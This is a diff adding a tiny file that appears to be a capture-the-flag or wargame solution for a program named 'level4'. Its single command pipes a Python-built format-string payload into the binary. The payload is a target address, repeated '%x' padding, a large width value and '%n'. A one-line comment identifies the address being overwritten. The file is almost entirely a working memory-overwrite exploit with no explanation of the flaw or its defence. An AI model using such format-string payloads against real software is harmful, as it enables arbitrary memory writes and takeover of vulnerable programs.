@@ -1,0 +1,5 @@
+python -c "print('\x10\x98\x04\x08' + '%x' * 10 + '%16930052x'  + '%n')" | ./level4
+
+x10\x98\x04\x08: Address we need to overwrite
+
+
